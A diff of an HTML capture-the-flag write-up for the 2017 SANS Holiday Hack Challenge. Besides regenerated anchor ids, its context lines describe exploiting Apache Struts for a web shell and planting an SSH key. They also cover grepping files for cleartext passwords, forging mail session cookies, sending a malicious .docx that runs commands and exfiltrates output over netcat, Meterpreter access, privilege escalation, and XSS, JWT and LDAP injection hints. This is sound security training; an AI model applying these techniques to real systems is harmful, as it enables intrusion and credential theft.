+<div id="outline-container-orge93d6f1" class="outline-4">
+<h4 id="q2_question"><a id="orge93d6f1"></a>Question</h4>
 <div class="outline-text-4" id="text-q2_question">
 <p>
 Investigate the Letters to Santa application at
@@ -3354,8 +3367,8 @@ Alabaster Snowball's password?
 </div>
 </div>
 
-<div id="outline-container-orgb1afaa6" class="outline-4">
-<h4 id="q2_background-information"><a id="orgb1afaa6"></a>Background Information</h4>
+<div id="outline-container-org507e7a7" class="outline-4">
+<h4 id="q2_background-information"><a id="org507e7a7"></a>Background Information</h4>
 <div class="outline-text-4" id="text-q2_background-information">
 <p>
 We know that there is an application on <code>https://l2s.northpolechristmastown.com</code> that we need to investigate.
@@ -3396,8 +3409,8 @@ bash shell, and bypassing the I/O restriction with tee</li>
 </div>
 </div>
 
-<div id="outline-container-org1ca6e3a" class="outline-4">
-<h4 id="q2_goal"><a id="org1ca6e3a"></a>Goal</h4>
+<div id="outline-container-org3e8d8a4" class="outline-4">
+<h4 id="q2_goal"><a id="org3e8d8a4"></a>Goal</h4>
 <div class="outline-text-4" id="text-q2_goal">
 <p>
 There are two goals for this challenge. The first is to determine the topic of
@@ -3407,8 +3420,8 @@ is to determine what Alabaster's password is.
 </div>
 </div>
 
-<div id="outline-container-orgab131e8" class="outline-4">
-<h4 id="q2_approach"><a id="orgab131e8"></a>Approach</h4>
+<div id="outline-container-orgf462879" class="outline-4">
+<h4 id="q2_approach"><a id="orgf462879"></a>Approach</h4>
 <div class="outline-text-4" id="text-q2_approach">
 <p>
 According to the second hint there might be development code left in the production code.
@@ -3608,8 +3621,8 @@ $ find / -name *.pdf
 </div>
 
 <ul class="org-ul">
-<li><a id="org6ffb22f"></a>Command Execution<br />
-<div class="outline-text-6" id="text-org6ffb22f">
+<li><a id="org4b9b8b9"></a>Command Execution<br />
+<div class="outline-text-6" id="text-org4b9b8b9">
 <p>
 It looks like we found our web root. Let's try out the
 web shell they suggest in the hints from Josh Wright
@@ -3664,14 +3677,14 @@ A closer look at <code>OrderMySql.class</code> using <code>cat /opt/apache-tomca
 </ul>
 </div>
 
-<div id="outline-container-org109dea5" class="outline-4">
-<h4 id="q2_solution"><a id="org109dea5"></a>Solution</h4>
+<div id="outline-container-org32fb9dc" class="outline-4">
+<h4 id="q2_solution"><a id="org32fb9dc"></a>Solution</h4>
 <div class="outline-text-4" id="text-q2_solution">
 </div>
 
 <ul class="org-ul">
-<li><a id="org2d46cc4"></a>What is the topic of The Great Book page available in the web root of the server?<br />
-<div class="outline-text-6" id="text-org2d46cc4">
+<li><a id="org0ecad91"></a>What is the topic of The Great Book page available in the web root of the server?<br />
+<div class="outline-text-6" id="text-org0ecad91">
 <p>
 Leveraging the Apache Struts vulnerability, we can run <code>ls</code> on the
 common web root of <code>/var/www/html</code>, and get the filename of the page,
@@ -3687,8 +3700,8 @@ On the Topic of Flying Animals
 </div>
 </li>
 
-<li><a id="org94564fa"></a>What is Alabaster Snowball’s password?<br />
-<div class="outline-text-6" id="text-org94564fa">
+<li><a id="org2c0c5e8"></a>What is Alabaster Snowball’s password?<br />
+<div class="outline-text-6" id="text-org2c0c5e8">
 <p>
 The trick here is just finding the right file, and the password is in
 cleartext in that file. We used <code>find</code> to <code>grep</code> all the files for
@@ -3705,14 +3718,14 @@ cleartext in that file. We used <code>find</code> to <code>grep</code> all the f
 </ul>
 </div>
 
-<div id="outline-container-org82f1ba3" class="outline-4">
-<h4 id="q2_alternatives"><a id="org82f1ba3"></a>Alternatives</h4>
+<div id="outline-container-orga6442be" class="outline-4">
+<h4 id="q2_alternatives"><a id="orga6442be"></a>Alternatives</h4>
 <div class="outline-text-4" id="text-q2_alternatives">
 </div>
 
 <ul class="org-ul">
-<li><a id="org5c8b300"></a>Add an authorized_key<br />
-<div class="outline-text-6" id="text-org5c8b300">
+<li><a id="org40f0306"></a>Add an authorized_key<br />
+<div class="outline-text-6" id="text-org40f0306">
 <p>
 One thing you can do if you don't have the password yet is actually
 add an ssh key to alabaster's authorized keys file. This is
@@ -3778,8 +3791,8 @@ take about 1 minute then you have to parse through the results.
 </div>
 </li>
 
-<li><a id="org9f380fb"></a>Automate the webshell<br />
-<div class="outline-text-6" id="text-org9f380fb">
+<li><a id="orgd29810d"></a>Automate the webshell<br />
+<div class="outline-text-6" id="text-orgd29810d">
 <p>
 We can automate dropping a webshell and creating a mini shell to query
 it. Assuming we have <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a> in
@@ -3881,8 +3894,8 @@ Linux hhc17-apache-struts1 4.9.0-5-amd64 #1 SMP Debian 4.9.65-3+deb9u2 (2018-01-
 </div>
 </li>
 
-<li><a id="org6377fa4"></a>Search even faster with ripgrep<br />
-<div class="outline-text-6" id="text-org6377fa4">
+<li><a id="org3f991c7"></a>Search even faster with ripgrep<br />
+<div class="outline-text-6" id="text-org3f991c7">
 <p>
 Ripgrep is a super fast grep replacement written in rust. It does a
 better job at filtering binary files, so we can run this command that
@@ -3909,8 +3922,8 @@ www-data@l2s:$ find / -type f -xdev -user alabaster_snowball 2&gt;/dev/null |
 </ul>
 </div>
 
-<div id="outline-container-org6ffe315" class="outline-4">
-<h4 id="q2_common-pitfalls"><a id="org6ffe315"></a>Common Pitfalls</h4>
+<div id="outline-container-org5f3286c" class="outline-4">
+<h4 id="q2_common-pitfalls"><a id="org5f3286c"></a>Common Pitfalls</h4>
 <div class="outline-text-4" id="text-q2_common-pitfalls">
 <p>
 A common pitfall is the blind injection aspect of the Apache Struts exploit. There were a couple of ways around this:
@@ -3931,8 +3944,8 @@ the time the system was installed.
 </div>
 </div>
 
-<div id="outline-container-org67f26f6" class="outline-4">
-<h4 id="q2_about-the-challenge"><a id="org67f26f6"></a>About the Challenge</h4>
+<div id="outline-container-orgb430cd2" class="outline-4">
+<h4 id="q2_about-the-challenge"><a id="orgb430cd2"></a>About the Challenge</h4>
 <div class="outline-text-4" id="text-q2_about-the-challenge">
 <p>
 Initially the host has a couple of noticeable holes.
@@ -3949,9 +3962,9 @@ The server itself housed two virtual web hosts, the Letter's to Santa applicatio
 </div>
 </div>
 
-<div id="outline-container-org3d17a46" class="outline-4">
-<h4 id="org3d17a46">Moving Foward</h4>
-<div class="outline-text-4" id="text-org3d17a46">
+<div id="outline-container-orgd038bbf" class="outline-4">
+<h4 id="orgd038bbf">Moving Foward</h4>
+<div class="outline-text-4" id="text-orgd038bbf">
 <p>
 Now that we have a script to automate access to l2s let's run nmap to scan the internal network.
 </p>
@@ -4101,12 +4114,12 @@ Nmap done: 256 IP addresses (7 hosts up) scanned in 14.86 seconds
 </div>
 </div>
 </div>
-<div id="outline-container-org5b76bc9" class="outline-3">
-<h3 id="org5b76bc9">SMB: Windows Fileshare</h3>
-<div class="outline-text-3" id="text-org5b76bc9">
+<div id="outline-container-org84f2201" class="outline-3">
+<h3 id="org84f2201">SMB: Windows Fileshare</h3>
+<div class="outline-text-3" id="text-org84f2201">
 </div>
-<div id="outline-container-org4dc18cd" class="outline-4">
-<h4 id="q3_question"><a id="org4dc18cd"></a>Question</h4>
+<div id="outline-container-orgd02b2ef" class="outline-4">
+<h4 id="q3_question"><a id="orgd02b2ef"></a>Question</h4>
 <div class="outline-text-4" id="text-q3_question">
 <p>
 The North Pole engineering team uses a Windows SMB server for sharing
@@ -4117,8 +4130,8 @@ What is the file server share name?
 </div>
 </div>
 
-<div id="outline-container-org4028406" class="outline-4">
-<h4 id="q3_background-information"><a id="org4028406"></a>Background Information</h4>
+<div id="outline-container-org683e4d2" class="outline-4">
+<h4 id="q3_background-information"><a id="org683e4d2"></a>Background Information</h4>
 <div class="outline-text-4" id="text-q3_background-information">
 <p>
 The scope statement calls out systems on 10.142.0.0/24 as being in scope:
@@ -4170,8 +4183,8 @@ This post on the SANS Pen Testing Blog seems relevant, but masscan isn't install
 </div>
 </div>
 
-<div id="outline-container-orgd23aac8" class="outline-4">
-<h4 id="q3_goal"><a id="orgd23aac8"></a>Goal</h4>
+<div id="outline-container-org0c22959" class="outline-4">
+<h4 id="q3_goal"><a id="org0c22959"></a>Goal</h4>
 <div class="outline-text-4" id="text-q3_goal">
 <p>
 Three separate things:
@@ -4185,8 +4198,8 @@ Three separate things:
 </div>
 </div>
 
-<div id="outline-container-org2c5de55" class="outline-4">
-<h4 id="q3_approach"><a id="org2c5de55"></a>Approach</h4>
+<div id="outline-container-org1d1a3b6" class="outline-4">
+<h4 id="q3_approach"><a id="org1d1a3b6"></a>Approach</h4>
 <div class="outline-text-4" id="text-q3_approach">
 <p>
 Let's follow the <code>nmap</code> overview.
@@ -4408,8 +4421,8 @@ getting file \Naughty and Nice List.docx of size 60344 as Naughty and Nice List.
 </div>
 </div>
 
-<div id="outline-container-org055f9bd" class="outline-4">
-<h4 id="q3_solution"><a id="org055f9bd"></a>Solution</h4>
+<div id="outline-container-orgd6deada" class="outline-4">
+<h4 id="q3_solution"><a id="orgd6deada"></a>Solution</h4>
 <div class="outline-text-4" id="text-q3_solution">
 <p>
 We used <code>nmap</code> to list our targets, and found <code>hhc17-smb-server</code>. We
@@ -4419,8 +4432,8 @@ credentials we found for question 2 to connect.
 </div>
 </div>
 
-<div id="outline-container-orgba9e447" class="outline-4">
-<h4 id="q3_common-pitfalls"><a id="orgba9e447"></a>Common Pitfalls</h4>
+<div id="outline-container-org1984555" class="outline-4">
+<h4 id="q3_common-pitfalls"><a id="org1984555"></a>Common Pitfalls</h4>
 <div class="outline-text-4" id="text-q3_common-pitfalls">
 <p>
 It looks like <code>hhc17-smb-server</code> blocks pings. By default, <code>nmap</code> uses
@@ -4454,12 +4467,12 @@ Host script results:
 </div>
 </div>
 </div>
-<div id="outline-container-org1b14128" class="outline-3">
-<h3 id="org1b14128">EWA: Elf Web Access</h3>
-<div class="outline-text-3" id="text-org1b14128">
+<div id="outline-container-orgbbebfa0" class="outline-3">
+<h3 id="orgbbebfa0">EWA: Elf Web Access</h3>
+<div class="outline-text-3" id="text-orgbbebfa0">
 </div>
-<div id="outline-container-org2c79298" class="outline-4">
-<h4 id="q4_question"><a id="org2c79298"></a>Question</h4>
+<div id="outline-container-org40a04a1" class="outline-4">
+<h4 id="q4_question"><a id="org40a04a1"></a>Question</h4>
 <div class="outline-text-4" id="text-q4_question">
 <p>
 Elf Web Access (EWA) is the preferred mailer for North Pole elves,
@@ -4470,8 +4483,8 @@ server?
 </div>
 </div>
 
-<div id="outline-container-org404aef0" class="outline-4">
-<h4 id="q4_background-information"><a id="org404aef0"></a>Background Information</h4>
+<div id="outline-container-org59e29e1" class="outline-4">
+<h4 id="q4_background-information"><a id="org59e29e1"></a>Background Information</h4>
 <div class="outline-text-4" id="text-q4_background-information">
 <p>
 Hints:
@@ -4491,8 +4504,8 @@ Pepper Minstix gives us the following hints:
 </div>
 </div>
 
-<div id="outline-container-org79a146f" class="outline-4">
-<h4 id="q4_goal"><a id="org79a146f"></a>Goal</h4>
+<div id="outline-container-org20212d1" class="outline-4">
+<h4 id="q4_goal"><a id="org20212d1"></a>Goal</h4>
 <div class="outline-text-4" id="text-q4_goal">
 <p>
 The question tells us that the page we're looking for is in an e-mail. So, we need to figure out some way to login to the mail system and find the crucial message.
@@ -4500,8 +4513,8 @@ The question tells us that the page we're looking for is in an e-mail. So, we ne
 </div>
 </div>
 
-<div id="outline-container-orga2d5334" class="outline-4">
-<h4 id="q4_approach"><a id="orga2d5334"></a>Approach</h4>
+<div id="outline-container-org948a490" class="outline-4">
+<h4 id="q4_approach"><a id="org948a490"></a>Approach</h4>
 <div class="outline-text-4" id="text-q4_approach">
 <p>
 First off, let's pull up the website in our web browser. SSH can run a
@@ -4815,8 +4828,8 @@ At this point, we can start digging through Alabaster's e-mail. Soon, we find th
 </div>
 
 <ul class="org-ul">
-<li><a id="orge8b8981"></a>An Alternative Solution: Black Box Cracking<br />
-<div class="outline-text-6" id="text-orge8b8981">
+<li><a id="org8b3343f"></a>An Alternative Solution: Black Box Cracking<br />
+<div class="outline-text-6" id="text-org8b3343f">
 <p>
 Given some of the discussion in the chat, this was one of the hardest
 questions. This section goes deeper into the cookie creation and
@@ -4997,8 +5010,8 @@ bytes of == for base64 purposes.
 </div>
 </li>
 
-<li><a id="org4aeacf6"></a>Tool Development<br />
-<div class="outline-text-6" id="text-org4aeacf6">
+<li><a id="org7fbb208"></a>Tool Development<br />
+<div class="outline-text-6" id="text-org7fbb208">
 <p>
 We created a script, TODO LINK TO EWA SCRIPT, which will forge a
 cookie to login as a user, and then dump all the e-mails as JSON. In
@@ -5039,8 +5052,8 @@ $ cat alabaster_inbox.json | jq '.INBOX[].HEADERS.body.subject' -c
 </ul>
 </div>
 
-<div id="outline-container-org1f499d3" class="outline-4">
-<h4 id="q4_solution"><a id="org1f499d3"></a>Solution</h4>
+<div id="outline-container-org1ef25cc" class="outline-4">
+<h4 id="q4_solution"><a id="org1ef25cc"></a>Solution</h4>
 <div class="outline-text-4" id="text-q4_solution">
 <p>
 Alabaster Snowball had a vulnerability in his cookie validation code,
@@ -5053,8 +5066,8 @@ we're looking for.
 </div>
 </div>
 
-<div id="outline-container-org093a210" class="outline-4">
-<h4 id="q4_alternatives"><a id="org093a210"></a>Alternatives</h4>
+<div id="outline-container-org889d0dc" class="outline-4">
+<h4 id="q4_alternatives"><a id="org889d0dc"></a>Alternatives</h4>
 <div class="outline-text-4" id="text-q4_alternatives">
 <p>
 If only we could crack Alabaster's password, we wouldn't need to forge
@@ -5063,8 +5076,8 @@ any cookies. But more on that later&#x2026;
 </div>
 </div>
 
-<div id="outline-container-org030b37e" class="outline-4">
-<h4 id="q4_common-pitfalls"><a id="org030b37e"></a>Common Pitfalls</h4>
+<div id="outline-container-orgf562172" class="outline-4">
+<h4 id="q4_common-pitfalls"><a id="orgf562172"></a>Common Pitfalls</h4>
 <div class="outline-text-4" id="text-q4_common-pitfalls">
 <p>
 As previously mentioned, this seemed to be one of the most-discussed
@@ -5075,12 +5088,12 @@ application completely.
 </div>
 </div>
 </div>
-<div id="outline-container-org5bcc11b" class="outline-3">
-<h3 id="org5bcc11b">NPPD: Naughty Moles</h3>
-<div class="outline-text-3" id="text-org5bcc11b">
+<div id="outline-container-org0959fd7" class="outline-3">
+<h3 id="org0959fd7">NPPD: Naughty Moles</h3>
+<div class="outline-text-3" id="text-org0959fd7">
 </div>
-<div id="outline-container-orgf810485" class="outline-4">
-<h4 id="q5_question"><a id="orgf810485"></a>Question</h4>
+<div id="outline-container-org0245c5a" class="outline-4">
+<h4 id="q5_question"><a id="org0245c5a"></a>Question</h4>
 <div class="outline-text-4" id="text-q5_question">
 <p>
 How many infractions are required to be marked as naughty on Santa's
@@ -5091,8 +5104,8 @@ Pole Mountain and what is your proof?
 </div>
 </div>
 
-<div id="outline-container-orgbe02945" class="outline-4">
-<h4 id="q5_background-information"><a id="orgbe02945"></a>Background Information</h4>
+<div id="outline-container-orgaeb90ff" class="outline-4">
+<h4 id="q5_background-information"><a id="orgaeb90ff"></a>Background Information</h4>
 <div class="outline-text-4" id="text-q5_background-information">
 <p>
 We need to answer 3 questions involving infractions, insider moles and who is throwing snowballs. We need 4 things to answer these questions.
@@ -5107,8 +5120,8 @@ We need to answer 3 questions involving infractions, insider moles and who is th
 </div>
 </div>
 
-<div id="outline-container-org346c331" class="outline-4">
-<h4 id="q5_goal"><a id="org346c331"></a>Goal</h4>
+<div id="outline-container-org2f9630d" class="outline-4">
+<h4 id="q5_goal"><a id="org2f9630d"></a>Goal</h4>
 <div class="outline-text-4" id="text-q5_goal">
 <ul class="org-ul">
 <li>We need to identify what factors trigger a 'naughty' flag.</li>
@@ -5118,8 +5131,8 @@ We need to answer 3 questions involving infractions, insider moles and who is th
 </div>
 </div>
 
-<div id="outline-container-org4b15552" class="outline-4">
-<h4 id="q5_approach"><a id="org4b15552"></a>Approach</h4>
+<div id="outline-container-org367a59c" class="outline-4">
+<h4 id="q5_approach"><a id="org367a59c"></a>Approach</h4>
 <div class="outline-text-4" id="text-q5_approach">
 <p>
 Playing around with the infractions page we can see that once you do a search a Download option becomes available to download all the search results in json format. Let's automate this to create a local copy of all the data. We can do this searching for all results before and during a specific date, and all results after that date. We then combine those results into a single file. We can automate this with a script we'll call <code>nppd.py</code>.
@@ -5266,8 +5279,8 @@ It means, buckle your seatbelt, dear player, because the North Pole is going bye
 </div>
 </div>
 
-<div id="outline-container-org1fb6421" class="outline-4">
-<h4 id="q5_solution"><a id="org1fb6421"></a>Solution</h4>
+<div id="outline-container-org14e2732" class="outline-4">
+<h4 id="q5_solution"><a id="org14e2732"></a>Solution</h4>
 <div class="outline-text-4" id="text-q5_solution">
 <p>
 It appears we need <code>4</code> infractions to make the Naughty list.
@@ -5291,12 +5304,12 @@ According to the unlocked chat with Sam, the person throwing snowballs is <code>
 </div>
 </div>
 </div>
-<div id="outline-container-org28d0ade" class="outline-3">
-<h3 id="org28d0ade">EaaS: TODO Question 6</h3>
-<div class="outline-text-3" id="text-org28d0ade">
+<div id="outline-container-orge804d95" class="outline-3">
+<h3 id="orge804d95"><span class="todo TODO">TODO</span> EaaS: Question 6</h3>
+<div class="outline-text-3" id="text-orge804d95">
 </div>
-<div id="outline-container-orgdb43161" class="outline-4">
-<h4 id="q6_question"><a id="orgdb43161"></a>Question</h4>
+<div id="outline-container-org4f6e386" class="outline-4">
+<h4 id="q6_question"><a id="org4f6e386"></a>Question</h4>
 <div class="outline-text-4" id="text-q6_question">
 <p>
 The North Pole engineering team has introduced an Elf as a Service
@@ -5310,8 +5323,8 @@ What is the title of The Great Book page?
 </div>
 </div>
 
-<div id="outline-container-orgd880826" class="outline-4">
-<h4 id="q6_background-information"><a id="orgd880826"></a>Background Information</h4>
+<div id="outline-container-org3f9f91b" class="outline-4">
+<h4 id="q6_background-information"><a id="org3f9f91b"></a>Background Information</h4>
 <div class="outline-text-4" id="text-q6_background-information">
 <p>
 Do we know anything about this system already?
@@ -5364,8 +5377,8 @@ masscan</li>
 </div>
 </div>
 
-<div id="outline-container-org38e202b" class="outline-4">
-<h4 id="q6_goal"><a id="org38e202b"></a>Goal</h4>
+<div id="outline-container-org3ce3049" class="outline-4">
+<h4 id="q6_goal"><a id="org3ce3049"></a>Goal</h4>
 <div class="outline-text-4" id="text-q6_goal">
 <p>
 What are we trying to accomplish?
@@ -5373,8 +5386,8 @@ What are we trying to accomplish?
 </div>
 </div>
 
-<div id="outline-container-orgc41759d" class="outline-4">
-<h4 id="q6_approach"><a id="orgc41759d"></a>Approach</h4>
+<div id="outline-container-org5d687fb" class="outline-4">
+<h4 id="q6_approach"><a id="org5d687fb"></a>Approach</h4>
 <div class="outline-text-4" id="text-q6_approach">
 <p>
 Describe the thought process that we tried here. How were we able to use
@@ -5383,8 +5396,8 @@ the hints or the blog posts?
 </div>
 </div>
 
-<div id="outline-container-orga5f943c" class="outline-4">
-<h4 id="q6_solution"><a id="orga5f943c"></a>Solution</h4>
+<div id="outline-container-org77969c8" class="outline-4">
+<h4 id="q6_solution"><a id="org77969c8"></a>Solution</h4>
 <div class="outline-text-4" id="text-q6_solution">
 <p>
 Summarize the reference solution that we found
@@ -5392,8 +5405,8 @@ Summarize the reference solution that we found
 </div>
 </div>
 
-<div id="outline-container-orgc0a43de" class="outline-4">
-<h4 id="q6_alternatives"><a id="orgc0a43de"></a>Alternatives</h4>
+<div id="outline-container-orgf940869" class="outline-4">
+<h4 id="q6_alternatives"><a id="orgf940869"></a>Alternatives</h4>
 <div class="outline-text-4" id="text-q6_alternatives">
 <p>
 Any other, easier solutions?
@@ -5401,8 +5414,8 @@ Any other, easier solutions?
 </div>
 </div>
 
-<div id="outline-container-org04791b4" class="outline-4">
-<h4 id="q6_common-pitfalls"><a id="org04791b4"></a>Common Pitfalls</h4>
+<div id="outline-container-org0c4ce13" class="outline-4">
+<h4 id="q6_common-pitfalls"><a id="org0c4ce13"></a>Common Pitfalls</h4>
 <div class="outline-text-4" id="text-q6_common-pitfalls">
 <p>
 Do we know what issue(s) people were running into?
@@ -5410,8 +5423,8 @@ Do we know what issue(s) people were running into?
 </div>
 </div>
 
-<div id="outline-container-orga39062e" class="outline-4">
-<h4 id="q6_about-the-challenge"><a id="orga39062e"></a>About the Challenge</h4>
+<div id="outline-container-orgaeceace" class="outline-4">
+<h4 id="q6_about-the-challenge"><a id="orgaeceace"></a>About the Challenge</h4>
 <div class="outline-text-4" id="text-q6_about-the-challenge">
 <p>
 How was the challenge setup? Was there a better way to secure this
@@ -5420,12 +5433,12 @@ system?
 </div>
 </div>
 </div>
-<div id="outline-container-org9ff07f0" class="outline-3">
-<h3 id="org9ff07f0">EMI: Going Deep</h3>
-<div class="outline-text-3" id="text-org9ff07f0">
+<div id="outline-container-org264a7d6" class="outline-3">
+<h3 id="org264a7d6">EMI: Going Deep</h3>
+<div class="outline-text-3" id="text-org264a7d6">
 </div>
-<div id="outline-container-orgfa936b9" class="outline-4">
-<h4 id="q7_question"><a id="orgfa936b9"></a>Question</h4>
+<div id="outline-container-org4f6a9ca" class="outline-4">
+<h4 id="q7_question"><a id="org4f6a9ca"></a>Question</h4>
 <div class="outline-text-4" id="text-q7_question">
 <p>
 Like any other complex SCADA systems, the North Pole uses Elf-Machine
@@ -5439,8 +5452,8 @@ describe?
 </div>
 </div>
 
-<div id="outline-container-org4a612a9" class="outline-4">
-<h4 id="q7_background-information"><a id="org4a612a9"></a>Background Information</h4>
+<div id="outline-container-org959b236" class="outline-4">
+<h4 id="q7_background-information"><a id="org959b236"></a>Background Information</h4>
 <div class="outline-text-4" id="text-q7_background-information">
 <p>
 Hints:
@@ -5602,8 +5615,8 @@ Alabaster Snowball.
 </div>
 </div>
 
-<div id="outline-container-orgfc4f995" class="outline-4">
-<h4 id="q7_goal"><a id="orgfc4f995"></a>Goal</h4>
+<div id="outline-container-org688bcd7" class="outline-4">
+<h4 id="q7_goal"><a id="org688bcd7"></a>Goal</h4>
 <div class="outline-text-4" id="text-q7_goal">
 <p>
 We're trying to craft a malicious .docx file which we'll e-mail to
@@ -5614,8 +5627,8 @@ embed in the file should get us access to <code>C:\GreatBookPage7.pdf</code>.
 </div>
 </div>
 
-<div id="outline-container-org73dd7b2" class="outline-4">
-<h4 id="q7_approach"><a id="org73dd7b2"></a>Approach</h4>
+<div id="outline-container-org55420d6" class="outline-4">
+<h4 id="q7_approach"><a id="org55420d6"></a>Approach</h4>
 <div class="outline-text-4" id="text-q7_approach">
 <p>
 At this point, we have a pretty good idea of what we need to do. The
@@ -5663,8 +5676,8 @@ After we send the message, we wait a few minutes, and soon the file shows up!
 </div>
 </div>
 
-<div id="outline-container-org9bdbf8d" class="outline-4">
-<h4 id="q7_solution"><a id="org9bdbf8d"></a>Solution</h4>
+<div id="outline-container-orgab33dbe" class="outline-4">
+<h4 id="q7_solution"><a id="orgab33dbe"></a>Solution</h4>
 <div class="outline-text-4" id="text-q7_solution">
 <p>
 We modified <code>MEMO - Calculator Access for Wunorse.docx</code> to copy the PDF into the IIS webroot, e-mailed that to Alabaster, then downloaded the copy of the file once it showed up.
@@ -5672,9 +5685,9 @@ We modified <code>MEMO - Calculator Access for Wunorse.docx</code> to copy the P
 </div>
 </div>
 
-<div id="outline-container-org712c4e5" class="outline-4">
-<h4 id="org712c4e5">Going Deeper &#x2013; Command Execution</h4>
-<div class="outline-text-4" id="text-org712c4e5">
+<div id="outline-container-org88240ba" class="outline-4">
+<h4 id="org88240ba">Going Deeper &#x2013; Command Execution</h4>
+<div class="outline-text-4" id="text-org88240ba">
 <p>
 Getting the PDF is cool, but what else can we find on this system? Some of the other e-mails harp on Alabaster having installed <code>netcat</code>, and having it in his path. Let's run a command, and pipe the result to <code>netcat</code>, which will send it back to our system:
 </p>
@@ -5740,9 +5753,9 @@ module, and use it to download the PDF.
 </div>
 </div>
 
-<div id="outline-container-org652b78f" class="outline-4">
-<h4 id="org652b78f">Level 2 &#x2013; Meterpreter Shell</h4>
-<div class="outline-text-4" id="text-org652b78f">
+<div id="outline-container-orgbc22119" class="outline-4">
+<h4 id="orgbc22119">Level 2 &#x2013; Meterpreter Shell</h4>
+<div class="outline-text-4" id="text-orgbc22119">
 <div class="note">
 <p>
 Originally, the system had Windows Defender enabled, which would block some default Meterpreter payloads
@@ -5835,9 +5848,9 @@ Meterpreter     : python/windows
 </div>
 </div>
 
-<div id="outline-container-org3e8bd2d" class="outline-4">
-<h4 id="org3e8bd2d">Getting Alabaster's Password</h4>
-<div class="outline-text-4" id="text-org3e8bd2d">
+<div id="outline-container-org7cc060c" class="outline-4">
+<h4 id="org7cc060c">Getting Alabaster's Password</h4>
+<div class="outline-text-4" id="text-org7cc060c">
 <p>
 Being able to use Meterpreter is nice, but it sure would be cool if we
 could Remote Desktop, or see if Alabaster's password is in use
@@ -5983,9 +5996,9 @@ discussion.
 </div>
 </div>
 
-<div id="outline-container-orgbe5b2b9" class="outline-4">
-<h4 id="orgbe5b2b9">Next up &#x2013; Privilege Escalation!</h4>
-<div class="outline-text-4" id="text-orgbe5b2b9">
+<div id="outline-container-org1b29ed7" class="outline-4">
+<h4 id="org1b29ed7">Next up &#x2013; Privilege Escalation!</h4>
+<div class="outline-text-4" id="text-org1b29ed7">
 <p>
 Unfortunately, our commands only run as Alabaster, who is just a
 regular user on the EMI system. We can do better than that.
@@ -6453,12 +6466,12 @@ We did, however, find some neat things in the Firefox browsing history of the sy
 </div>
 </div>
 </div>
-<div id="outline-container-org3991694" class="outline-3">
-<h3 id="org3991694"><span class="todo TODO">TODO</span> EDB: Question 8</h3>
-<div class="outline-text-3" id="text-org3991694">
+<div id="outline-container-org0827987" class="outline-3">
+<h3 id="org0827987">EDB: eLfDAP Injection</h3>
+<div class="outline-text-3" id="text-org0827987">
 </div>
-<div id="outline-container-orgfc1a978" class="outline-4">
-<h4 id="q8_question"><a id="orgfc1a978"></a>Question</h4>
+<div id="outline-container-org70bf0a3" class="outline-4">
+<h4 id="q8_question"><a id="org70bf0a3"></a>Question</h4>
 <div class="outline-text-4" id="text-q8_question">
 <p>
 Fetch the letter to Santa from the North Pole Elf Database at
@@ -6467,102 +6480,91 @@ Fetch the letter to Santa from the North Pole Elf Database at
 </div>
 </div>
 
-<div id="outline-container-org64ffda9" class="outline-4">
-<h4 id="q8_background-information"><a id="org64ffda9"></a>Background Information</h4>
+<div id="outline-container-org5231390" class="outline-4">
+<h4 id="q8_background-information"><a id="org5231390"></a>Background Information</h4>
 <div class="outline-text-4" id="text-q8_background-information">
 <p>
-Do we know anything about this system already?
+We can pull up the website in a web browser, and we see a login page.
+</p>
+
+
+<div class="figure">
+<p><img src="./images/edb_login.png" alt="edb_login.png" width="350px" />
+</p>
+<p><span class="figure-number">Figure 24: </span>Elf Database Login</p>
+</div>
+
+<p>
+We can try some of the passwords we've already recovered, without success. However, at the bottom of the page, there's a support link, which pops up this form:
+</p>
+
+
+<div class="figure">
+<p><img src="./images/edb_login_support.png" alt="edb_login_support.png" width="350px" />
+</p>
+<p><span class="figure-number">Figure 25: </span>Elf Database Login Support</p>
+</div>
+
+<p>
+Wunorse Openslae provides us the following:
+</p>
+
+<div class="hint">
+<p>
+Many people don't know this, but most of us elves have multiple jobs here in the North Pole. In addition to working in Santa's workshop, I also work as a help desk support associate for the North Pole Elf Database site. I answer password reset requests, mostly from other elves.
+</p>
+
+</div>
+<div class="hint">
+<p>
+One time, I got a weird email with a JavaScript alert and my account got hacked. Fortunately, Alabaster was able to add some filtering on the system to prevent that from happening again. I sure hope he tested his changes against the common evasion techniques discussed on the <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS filter evasion cheat sheet</a>.
+</p>
+
+</div>
+<div class="hint">
+<p>
+It's never a good idea to come up with your own encryption scheme with cookies. Alabaster told me he uses JWT tokens because they are super secure as long as you use a long and complex key. Otherwise, they could be cracked and recreated using any old framework like <a href="https://github.com/jpadilla/pyjwt">pyjwt</a> to forge a key.
+</p>
+
+</div>
+<div class="hint">
+<p>
+The interface we use lets us query our directory database with all the employee information. Per Santa's request, Alabaster restricted the search results to just the elves and reindeer. Hopefully, he secured that too. I found an article recently talking about <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">injection against similar databases</a>.
+</p>
+
+</div>
+
+<p>
+This blog post is explicitly called out:
 </p>
 
 <p>
-Hints:
-</p>
-
-<p>
-List any useful hints here.
-</p>
-
-<p>
-Blog Posts:
-</p>
-
-<p>
-Are any of these useful?
-</p>
-
-<ul class="org-ul">
-<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
-(EC2)
-<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
-Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
-<li>Your Pokemon Guide for Essential SQL Pen Test Commands
-<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
-<li>Exploiting XXE Vulnerabilities in IIS/.NET
-<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
-<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
